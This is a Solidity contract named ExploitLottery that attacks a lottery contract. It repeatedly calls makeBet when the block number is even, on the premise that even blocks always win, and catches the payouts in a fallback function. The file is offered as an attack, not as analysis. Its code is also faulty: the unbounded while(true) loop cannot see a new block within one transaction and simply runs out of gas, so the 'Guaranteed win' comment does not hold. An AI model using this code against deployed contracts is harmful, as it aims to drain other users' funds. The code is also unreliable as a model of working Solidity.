pragma solidity ^0.4.0;

interface ILottery {
    function makeBet() external payable;
}

contract ExploitLottery {
    ILottery public vulnerableLottery;

    function ExploitLottery(address _lotteryAddress) {
        vulnerableLottery = ILottery(_lotteryAddress);
    }

    function attack() public payable {
        require(msg.value >= 1 ether); // Seed with at least 1 ether

        // Keep trying to bet on an even block
        while (true) {
            if (block.number % 2 == 0) {
                // Guaranteed win
                vulnerableLottery.makeBet.value(0.1 ether)();
            }
        }
    }

    // Allow contract to receive ETH back from winning
    function() public payable {}
}

